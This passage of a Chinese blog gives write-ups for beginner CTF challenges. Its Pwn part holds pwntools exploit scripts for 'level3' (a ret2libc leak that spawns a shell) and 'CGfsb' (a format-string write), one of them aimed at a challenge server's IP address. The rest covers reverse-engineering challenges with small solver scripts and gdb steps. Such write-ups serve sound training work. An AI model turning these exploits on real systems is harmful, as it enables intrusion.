class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys)+p32(<span class="number">0xdeadbeef</span>)+p32(sh)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;hello,you can leave some message here:&quot;</span>,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803213109114.png" alt="image-20210803213109114"></p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>照例</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803215305368.png" alt="image-20210803215305368"></p>
<p>看IDA里有read和write，是ret2libc的题型，直接看wp</p>
<p>思路是通过read函数的栈溢出返回到write函数，利用write函数写出__libc_start_main在got表中的位置，利用LibcSearcher工具查找到相应的libc库，从而得到基地址，不过题目给了也不用工具</p>
<p>拿exp——</p>
<p>使用工具版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x0804844b</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> +p32(write_plt) + p32(vuln) + p32(<span class="number">1</span>) + p32(libc_start_main_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">libc_start_main_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>, system, <span class="number">0xdeadbeef</span>, binsh])</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>使用题目库版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#r=process(&#x27;./level3&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> +p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">write_got_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line">libcbase = write_got_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libcbase</span><br><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>, system, <span class="number">0xdeadbeef</span>, binsh])</span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil(&#x27;:\n&#x27;)</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803233148272.png" alt="image-20210803233148272"></p>
<h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>照例</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803233438018.png" alt="image-20210803233438018"></p>
<p>IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210803235552887.png" alt="image-20210803235552887"></p>
<p>if语句可以分析出来pwnme=8就可以cat flag，又发现了printf，存在格式化字符串漏洞，通过地址任意写，即把s的内容写成pwnme的地址即8，所以先记录下pwnme的地址</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210804001143804.png" alt="image-20210804001143804"></p>
<p>然后找偏移量</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210804000926106.png" alt="image-20210804000926106"></p>
<p>数出来是10，即任意写可为%10$n，又因为p32将地址转为4个字节，所以还差4个字节，用“aaaa”代替就行</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./CGfsb&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">58931</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;please tell me your name:&quot;</span>,<span class="string">&quot;hh&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0804A068</span></span><br><span class="line">payload = p32(sys)+<span class="string">&quot;aaaa%10$n&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;leave your message please:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BPwn/image-20210804153644665.png" alt="image-20210804153644665"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/" class="post-title-link" itemprop="url">攻防世界新手Re</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-11-05 15:28:51 / 修改时间：15:29:35" itemprop="dateCreated datePublished" datetime="2021-11-05T15:28:51+08:00">2021-11-05</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Bin/" itemprop="url" rel="index"><span itemprop="name">Bin</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="攻防世界Re新手区"><a href="#攻防世界Re新手区" class="headerlink" title="攻防世界Re新手区"></a>攻防世界Re新手区</h2><h3 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h3><p>一段C的代码，一行行看，利用逆向思维反着来就行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;<span class="comment">//得出first=0xcafe转换成10进值为51966</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;<span class="comment">//second=25</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;<span class="comment">//argv[3]=’h4cky0u’</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后直接写出脚本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> first = <span class="number">51966</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> second=<span class="number">25</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(<span class="string">&quot;h4cky0u&quot;</span>) - <span class="number">1615810207</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210723204529916.png" alt="image-20210723204529916"></p>
<h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><p>法一：直接运行看到是<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717111904925.png" alt="image-20210717111904925"></p>
<p>类似数学？随便按1~8顺序按了一下，神奇的事情发生了。。。一脸懵逼，很突然的我也不知道原理</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717111847983.png" alt="image-20210717111847983"></p>
<p>法二：其实考点是算法</p>
<p>拖IDA，先找字符串发现没东西，然后main，f5</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717131544368.png" alt="image-20210717131544368"></p>
<p>似乎没东西，找看起来有东西的函数</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717131604221.png" alt="image-20210717131604221"></p>
<p>很明显调用了东西，点进去康康发现flag字眼</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717131653612.png" alt="image-20210717131653612"></p>
<p>他是一直到<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717131735829.png" alt="image-20210717131735829"></p>
<p>重点是循环语句那段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;v2 + i) ^= *(&amp;v59 + i);<span class="comment">//异或运算</span></span><br><span class="line">    *(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_45A7BE((<span class="keyword">int</span>)<span class="string">&quot;%s\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a= [<span class="number">18</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">12</span>,<span class="number">48</span>,<span class="number">65</span>,<span class="number">31</span>,<span class="number">78</span>,<span class="number">62</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">1</span>,<span class="number">57</span>,<span class="number">96</span>,<span class="number">3</span>,<span class="number">21</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">44</span>,<span class="number">65</span>,<span class="number">78</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">16</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">89</span>,<span class="number">45</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">15</span>,<span class="number">34</span>,<span class="number">18</span>,<span class="number">16</span>,<span class="number">0</span>]</span><br><span class="line">b=[<span class="number">123</span>,<span class="number">32</span>,<span class="number">18</span>,<span class="number">98</span>,<span class="number">119</span>,<span class="number">108</span>,<span class="number">65</span>,<span class="number">41</span>,<span class="number">124</span>,<span class="number">80</span>,<span class="number">125</span>,<span class="number">38</span>,<span class="number">124</span>,<span class="number">111</span>,<span class="number">74</span>,<span class="number">49</span>,<span class="number">83</span>,<span class="number">108</span>,<span class="number">94</span>,<span class="number">108</span>,<span class="number">84</span>,<span class="number">6</span>,<span class="number">96</span>,<span class="number">83</span>,<span class="number">44</span>,<span class="number">121</span>,<span class="number">104</span>,<span class="number">110</span>,<span class="number">32</span>,<span class="number">95</span>,<span class="number">117</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">123</span>,<span class="number">127</span>,<span class="number">119</span>,<span class="number">96</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">71</span>,<span class="number">92</span>,<span class="number">29</span>,<span class="number">81</span>,<span class="number">107</span>,<span class="number">90</span>,<span class="number">85</span>,<span class="number">64</span>,<span class="number">12</span>,<span class="number">43</span>,<span class="number">76</span>,<span class="number">86</span>,<span class="number">13</span>,<span class="number">114</span>,<span class="number">1</span>,<span class="number">117</span>,<span class="number">126</span>,<span class="number">0</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">    a[i] = a[i]^b[i]</span><br><span class="line">    a[i] = a[i]^<span class="number">19</span><span class="comment">#按R转换上文字符等于19</span></span><br><span class="line">    flag+=<span class="built_in">chr</span>(a[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717133351831.png" alt="image-20210717133351831"></p>
<h3 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello,CTF"></a>Hello,CTF</h3><p>先跑程序</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717134157670.png" alt="image-20210717134157670"></p>
<p>要输入啥的不知道，肯定是flag。拖IDA梭哈<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717134226130.png" alt="image-20210717134226130"></p>
<p><code>strcpy(&amp;v13, &quot;437261636b4d654a757374466f7246756e&quot;);</code></p>
<p>明显flag就是他。。一个16进制码（数字0<del>9和字母A</del>F），直接转码</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717134433247.png" alt="image-20210717134433247"></p>
<h3 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h3><p>考点：脱壳</p>
<p>从题目已知这个是加壳文件，工具先查一下壳</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717135043548.png" alt="image-20210717135043548"></p>
<p>下面的信息显示64bit知道是64位文件，upx知道是upx加壳</p>
<p>那就直接脱掉</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717135954434.png" alt="image-20210717135954434"></p>
<p>然后拖入IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717140107815.png" alt="image-20210717140107815"></p>
<p>映入眼帘。</p>
<p>法二：自己脱壳做出来后，网上说这个不用脱壳。。。直接拖入010一查就有。。像个misc似的</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717140929475.png" alt="image-20210717140929475"></p>
<h3 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h3><p>拖入IDA，main F5</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717143821052.png" alt="image-20210717143821052"></p>
<p>先将v7按R变成字符<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717153702029.png" alt="image-20210717153702029">然后倒过来取，即</p>
<p>v7=harambe，然后v8肯定是加密后的flag了</p>
<p>重点是循环语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sub_4007C0)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;harambe&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;:\&quot;AL_RT^L*.?+6/46&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c = <span class="built_in">ord</span>(a[i%<span class="number">7</span>])^<span class="built_in">ord</span>(b[i])</span><br><span class="line">    flag+=<span class="built_in">chr</span>(c)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210718192554946.png" alt="image-20210718192554946"></p>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-func-ord.html">ord()</a>函数是 chr() 函数（对于8位的ASCII字符串）或 unichr() 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值，如果所给的 Unicode 字符超出了你的 Python 定义范围，则会引发一个 TypeError 的异常。</p>
<h3 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h3><p>先查知道是32位ELF，再IDA</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717155525760.png" alt="image-20210717155525760"></p>
<p>觉得最后一个函数里有东西，点进去</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717160318691.png" alt="image-20210717160318691"></p>
<p>发现了一个看起来似乎很关键的函数decrypt，点进去看到<img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717160100419.png" alt="image-20210717160100419"></p>
<p>很明显返回的dest里有flag，而s和a2里面或许有dest相关的东西。但是看了半天点了半天没东西，直接看wp</p>
<p>回去看汇编</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717161812007.png" alt="image-20210717161812007"></p>
<p>通过汇编代码，了解到<strong>eax</strong>保存<strong>dest</strong>的值后传递给<strong>s2</strong>。</p>
<p>不需要去分析decrypt的内容了，直接上gdb动态调试。</p>
<p>gdb动态调试指令：</p>
<p><strong>下断点：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *地址</span><br></pre></td></tr></table></figure>
<p>由IDA看出decrypt的地址</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717174017012.png" alt="image-20210717174017012"></p>
<p>所以在他下一行加个断点</p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717174057614.png" alt="image-20210717174057614"></p>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717174226983.png" alt="image-20210717174226983"></p>
<p><strong>执行到断点所在位置</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717174301145.png" alt="image-20210717174301145"></p>
<p>单步跟踪：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n</span><br></pre></td></tr></table></figure>
<p>由于直接下断点在他的下一行所以不用跟了</p>
<p><strong>查看寄存器保存的内容：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure>
<p><img src="/2021/11/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8BRe/image-20210717174353300.png" alt="image-20210717174353300"></p>
<p><strong>查看内存地址（寄存器）中的值：</strong></p>
